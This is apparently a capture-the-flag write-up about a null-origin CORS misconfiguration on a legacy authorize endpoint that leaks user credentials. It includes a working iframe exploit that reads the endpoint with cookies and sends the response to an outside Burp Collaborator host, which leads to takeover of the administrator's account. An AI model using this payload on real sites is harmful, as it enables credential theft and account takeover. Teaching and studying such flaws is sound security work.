1. Register and notice a request to /api/v3/authorize.php which returns this in the response:

```json
{"username":"<your_username>", "error":"This endpoint is currently out of use because of previous issues."}
```

2. Fallback to the previous API routine by going to /api/v1/authorize.php instead and notice:

```json
{"username":"<your_username>", "password":"<your_password>"}
```
It returns your username and credentials but also returns `ACAO: <hostname>`

3. Bypass the CORS protection using the null origin which gets reflected in the response 

4. Write an exploit for the null origin (firefox only):

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','http://localhost/api/v1/authorize.php',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://xxxxxx.burpcollaborator.net/?source='+this.responseText;
};
</script>"></iframe>
```

Localhost is intentional since it's a headless browser who's accessing it.

5. Host your exploit and pass the exploit to the admin review endpoint & takeover administrator's account.

6. Login inside administrator's account and go to /account.php where you get he flag.








